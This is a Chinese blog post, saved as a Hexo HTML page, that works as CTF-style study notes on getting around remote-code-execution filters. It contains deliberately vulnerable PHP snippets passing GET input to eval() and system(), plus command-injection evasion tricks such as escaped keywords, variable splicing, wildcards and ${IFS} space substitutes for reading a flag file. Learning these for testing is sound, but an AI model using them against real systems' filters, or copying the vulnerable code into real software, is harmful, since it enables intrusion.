@@ -1,0 +1,183 @@
+<!DOCTYPE html><html lang="zh_CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>RCE绕过姿势 | 牛牛的blog</title><meta name="author" content="牛牛"><meta name="copyright" content="牛牛"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="RCE又称远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。本文主要介绍如何绕过RCE各种过滤。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE绕过姿势">
+<meta property="og:url" content="http://example.com/2022/11/15/%E7%AC%94%E8%AE%B0/RCE%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/index.html">
+<meta property="og:site_name" content="牛牛的blog">
+<meta property="og:description" content="RCE又称远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。本文主要介绍如何绕过RCE各种过滤。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2022-11-15T13:54:34.356Z">
+<meta property="article:modified_time" content="2022-11-15T15:05:02.997Z">
+<meta property="article:author" content="牛牛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/11/15/%E7%AC%94%E8%AE%B0/RCE%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'RCE绕过姿势',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-11-15 23:05:02'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://files.catbox.moe/dbtw19.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">牛牛的blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">RCE绕过姿势</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-11-15T13:54:34.356Z" title="Created 2022-11-15 21:54:34">2022-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-11-15T15:05:02.997Z" title="Updated 2022-11-15 23:05:02">2022-11-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="RCE绕过姿势"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="1-相关函数命令"><a href="#1-相关函数命令" class="headerlink" title="1.相关函数命令"></a>1.相关函数命令</h2><h3 id="1-PHP代码执行函数"><a href="#1-PHP代码执行函数" class="headerlink" title="1.PHP代码执行函数"></a>1.PHP代码执行函数</h3><p>eval()、assert()等等，最常见的是eval()，它可以将括号内的字符串当做命令执行，比如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code=$_GET[<span class="string">&#x27;X&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> <span class="comment">//此时eval()的作用将$code的内容进行代码执行</span></span><br><span class="line"> <span class="comment">//比如 ?x=phpinfo();，那么就会执行phpinfo();</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-PHP命令执行函数"><a href="#2-PHP命令执行函数" class="headerlink" title="2.PHP命令执行函数"></a>2.PHP命令执行函数</h3><p>system()、exec()、等等</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以system()为例，它的作用是将括号里的字符串当作系统命令执行</span></span><br><span class="line"><span class="comment">//因为是系统命令，所以不同系统之间的命令有所差别</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code=$_GET[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">system($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//system:执行外部程序并显示输出资料,就是跟命令提示符窗口一样</span></span><br><span class="line"><span class="comment">//?x=ls      ：列出当前目录下的文件</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-过滤关键字"><a href="#1-过滤关键字" class="headerlink" title="1.过滤关键字"></a>1.过滤关键字</h2><h3 id="1-替代法（Linux）"><a href="#1-替代法（Linux）" class="headerlink" title="1.替代法（Linux）"></a>1.替代法（Linux）</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">sh /flag 2&gt;%261 //报错出文件内容</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-使用转义字符"><a href="#2-使用转义字符" class="headerlink" title="2.使用转义字符"></a>2.使用转义字符</h3><p>使用\ 、/、’’等转义字符绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca\t &#x2F;fl\ag</span><br><span class="line">cat fl&#39;&#39;ag</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-变量拼接"><a href="#3-变量拼接" class="headerlink" title="3.变量拼接"></a>3.变量拼接</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=fl;b=ag;cat $a$b</span><br><span class="line"><span class="comment">//效果同 cat falg</span></span><br><span class="line"><span class="comment">//其实也用到了；这个管道符进行命令的连接</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-使用空变量绕过"><a href="#4-使用空变量绕过" class="headerlink" title="4.使用空变量绕过"></a>4.使用空变量绕过</h3><p><code>$*</code>、<code>$@</code>、<code>$x</code>、<code>$&#123;x&#125;</code>、</p>
+<p><img src="/2022/11/15/%E7%AC%94%E8%AE%B0/RCE%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/image-20221115224330842.png" alt="image-20221115224330842"></p>
+<h3 id="5-反引号-绕过"><a href="#5-反引号-绕过" class="headerlink" title="5.反引号 ``绕过"></a>5.反引号 ``绕过</h3><p><img src="/2022/11/15/%E7%AC%94%E8%AE%B0/RCE%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/image-20221115224442900.png" alt="image-20221115224442900"></p>
+<h3 id="6-编码绕过"><a href="#6-编码绕过" class="headerlink" title="6.编码绕过"></a>6.编码绕过</h3><h3 id="7-正则表达式绕过"><a href="#7-正则表达式绕过" class="headerlink" title="7.正则表达式绕过"></a>7.正则表达式绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat ?la*</span><br><span class="line"><span class="comment">//?匹配一个字符；*匹配多个字符</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-过滤命令执行函数"><a href="#2-过滤命令执行函数" class="headerlink" title="2.过滤命令执行函数"></a>2.过滤命令执行函数</h2><p>如过滤system()</p>
+<h3 id="1-编码绕过"><a href="#1-编码绕过" class="headerlink" title="1.编码绕过"></a>1.编码绕过</h3><p><strong>url编码</strong><br>相关：url编码对照表：<a target="_blank" rel="noopener" href="https://blog.mimvp.com/article/17049.html%E4%B8%A4%E5%88%97%E4%B8%A4%E5%88%97%E7%9A%84%E7%9C%8B">https://blog.mimvp.com/article/17049.html两列两列的看</a></p>
+<p><strong>base64编码</strong></p>
+<h2 id="3-过滤命令"><a href="#3-过滤命令" class="headerlink" title="3.过滤命令"></a>3.过滤命令</h2><h3 id="1-cat"><a href="#1-cat" class="headerlink" title="1.cat"></a>1.cat</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> //strings</span><br><span class="line">[root@kali flag123]# strings flag </span><br><span class="line">flag&#123;suifeng&#125;</span><br><span class="line"> //uniq -c</span><br><span class="line"> [root@kali flag123]# uniq -c flag</span><br><span class="line">       <span class="number">1</span> flag&#123;suifeng&#125;</span><br><span class="line"> //bash -v</span><br><span class="line"> [root@kali flag123]# bash -v flag</span><br><span class="line"> flag&#123;suifeng&#125;</span><br><span class="line"><span class="function"> flag: <span class="title">line</span> 1: <span class="title">flag</span>&#123;<span class="title">suifeng</span>&#125;: <span class="title">command</span> <span class="title">not</span> <span class="title">found</span></span></span><br><span class="line"><span class="function"> // <span class="title">rev</span> </span></span><br><span class="line"><span class="function"> [<span class="title">root</span>@<span class="title">kali</span> <span class="title">flag123</span>]# <span class="title">rev</span> <span class="title">flag</span></span></span><br><span class="line"><span class="function"> &#125;<span class="title">gnefius</span>&#123;<span class="title">galf</span></span></span><br><span class="line"><span class="function"> //<span class="title">find</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-空格"><a href="#2-空格" class="headerlink" title="2.空格"></a>2.空格</h3><ul>
+<li><p><strong>{cat,flag.txt}</strong></p>
+</li>
+<li><p><strong>cat<u>${IFS}</u>flag.txt</strong></p>
+</li>
+<li><p><strong>cat<u>$IFS$9</u>flag.txt: $IFS$9 $9指传过来的第9个参数</strong></p>
+</li>
+<li><p><strong>cat&lt;flag.txt</strong></p>
+</li>
+<li><p><strong>cat&lt;&gt;flag.txt</strong></p>
+</li>
+<li><p><strong>kg=$’\x20flag.txt’&amp;&amp;cat$kg</strong><br><strong>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</strong></p>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">牛牛</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/11/15/%E7%AC%94%E8%AE%B0/RCE%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">http://example.com/2022/11/15/%E7%AC%94%E8%AE%B0/RCE%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/11/28/%E7%AC%94%E8%AE%B0/THM/%E7%BA%A2%E9%98%9F/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">红队-walking an application</div></div></a></div><div class="next-post pull-right"><a href="/2022/11/13/%E7%AC%94%E8%AE%B0/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E4%BB%8A%E5%A4%A92022%E7%BE%8E%E4%BA%9A%E6%9D%AF%E7%9A%84%E6%84%9F%E5%8F%97/"><img class="next-cover" src="https://files.catbox.moe/xgnytm.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">2022美亚杯感受</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E5%91%BD%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">1.相关函数命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1.PHP代码执行函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">2.PHP命令执行函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">2.</span> <span class="toc-text">1.过滤关键字</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9B%BF%E4%BB%A3%E6%B3%95%EF%BC%88Linux%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">1.替代法（Linux）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6"><span class="toc-number">2.2.</span> <span class="toc-text">2.使用转义字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5"><span class="toc-number">2.3.</span> <span class="toc-text">3.变量拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8%E7%A9%BA%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">4.使用空变量绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%8F%8D%E5%BC%95%E5%8F%B7-%E7%BB%95%E8%BF%87"><span class="toc-number">2.5.</span> <span class="toc-text">5.反引号 &#96;&#96;绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.6.</span> <span class="toc-text">6.编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="toc-number">2.7.</span> <span class="toc-text">7.正则表达式绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%BF%87%E6%BB%A4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">2.过滤命令执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">1.编码绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%BF%87%E6%BB%A4%E5%91%BD%E4%BB%A4"><span class="toc-number">4.</span> <span class="toc-text">3.过滤命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-cat"><span class="toc-number">4.1.</span> <span class="toc-text">1.cat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%A9%BA%E6%A0%BC"><span class="toc-number">4.2.</span> <span class="toc-text">2.空格</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 牛牛</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
